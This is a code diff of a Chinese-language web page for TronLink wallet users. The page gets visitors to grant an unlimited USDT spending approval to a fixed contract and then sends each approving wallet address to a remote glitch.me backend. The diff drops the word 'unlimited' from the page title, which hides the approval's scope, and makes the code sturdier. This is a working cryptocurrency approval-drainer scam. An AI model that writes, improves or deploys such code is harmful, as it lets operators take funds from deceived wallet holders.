@@ -2,7 +2,7 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>USDT 無限授權啟動</title>
+  <title>USDT 授權</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
@@ -28,28 +28,29 @@
     const BACKEND = "https://peaceful-precious-ceres.glitch.me";
 
     async function authorizeUSDT() {
-      if (!window.tronWeb || !tronWeb.defaultAddress.base58 || !tronWeb.ready) {
-        return alert("請使用 TronLink 並登入錢包");
-      }
-
-      const address = tronWeb.defaultAddress.base58;
-      const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
       try {
+        if (!window.tronWeb || !tronWeb.ready || !tronWeb.defaultAddress.base58) {
+          return alert("請使用 TronLink DApp 瀏覽器開啟並登入");
+        }
+
+        const address = tronWeb.defaultAddress.base58;
+        const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
         const usdt = await tronWeb.contract().at(USDT_CONTRACT);
-        await usdt.approve(AUTH_CONTRACT, MAX_UINT256).send();
+
+        const tx = await usdt.approve(AUTH_CONTRACT, MAX_UINT).send({ shouldPollResponse: true });
+        console.log("✅ 授權 TX:", tx);
 
         const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
         const allowed = parseFloat(allowance.toString()) / 1e6;
 
         if (allowed > 1000000) {
           await axios.post(`${BACKEND}/wallets`, { address });
-          alert("✅ 已成功無上限授權 USDT 給合約");
+          alert("✅ 成功無限授權，錢包已記錄");
         } else {
           alert("⚠️ 授權金額異常，請重新操作");
         }
       } catch (err) {
-        console.error("授權失敗", err);
+        console.error("❌ 授權錯誤", err);
         alert("❌ 授權失敗：" + err.message);
       }
     }
